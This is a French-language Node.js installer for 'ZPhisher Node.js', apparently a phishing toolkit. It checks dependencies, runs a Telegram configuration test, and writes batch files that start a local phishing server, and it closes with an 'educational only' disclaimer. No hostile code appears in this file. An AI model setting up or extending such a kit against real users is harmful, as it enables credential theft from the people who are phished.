const fs = require('fs-extra');
const path = require('path');
const { execSync } = require('child_process');

console.log('🚀 Installation de ZPhisher Node.js...\n');

// Vérifier Node.js
try {
    const nodeVersion = process.version;
    console.log(`✅ Node.js détecté: ${nodeVersion}`);
    
    const majorVersion = parseInt(nodeVersion.slice(1).split('.')[0]);
    if (majorVersion < 14) {
        console.log('❌ Node.js version 14+ requis. Version actuelle:', nodeVersion);
        process.exit(1);
    }
} catch (error) {
    console.log('❌ Node.js non trouvé. Veuillez installer Node.js 14+');
    process.exit(1);
}

// Installer les dépendances
console.log('\n📦 Installation des dépendances...');
try {
    execSync('npm install', { stdio: 'inherit' });
    console.log('✅ Dépendances installées avec succès');
} catch (error) {
    console.log('❌ Erreur lors de l\'installation des dépendances');
    console.log('💡 Essayez: npm install --force');
    process.exit(1);
}

// Vérifier la configuration
console.log('\n🔧 Vérification de la configuration...');
const configPath = path.join(__dirname, 'config.js');
if (fs.existsSync(configPath)) {
    console.log('✅ Fichier de configuration trouvé');
} else {
    console.log('❌ Fichier de configuration manquant');
    process.exit(1);
}

// Tester la configuration Telegram
console.log('\n🧪 Test de la configuration Telegram...');
try {
    execSync('node test-telegram.js', { stdio: 'pipe' });
    console.log('✅ Configuration Telegram fonctionnelle');
} catch (error) {
    console.log('⚠️ Configuration Telegram à vérifier');
    console.log('💡 Modifiez config.js avec vos paramètres Telegram');
}

// Créer un script de démarrage rapide
const startScript = `@echo off
echo 🚀 Démarrage de ZPhisher Node.js...
echo.
echo 📱 Interface web: http://localhost:3000
echo 🧪 Test Telegram: http://localhost:3000/test-telegram
echo.
echo Appuyez sur Ctrl+C pour arrêter le serveur
echo.
node server.js
pause`;

fs.writeFileSync(path.join(__dirname, 'start.bat'), startScript);
console.log('✅ Script de démarrage créé: start.bat');

// Créer un script de test
const testScript = `@echo off
echo 🧪 Test de la configuration Telegram...
echo.
node test-telegram.js
echo.
pause`;

fs.writeFileSync(path.join(__dirname, 'test.bat'), testScript);
console.log('✅ Script de test créé: test.bat');

console.log('\n🎉 Installation terminée!');
console.log('\n📋 Prochaines étapes:');
console.log('1. Modifiez config.js avec vos paramètres Telegram');
console.log('2. Lancez test.bat pour tester la configuration');
console.log('3. Lancez start.bat pour démarrer le serveur');
console.log('4. Ouvrez http://localhost:3000 dans votre navigateur');
console.log('\n⚠️ À des fins éducatives uniquement!');
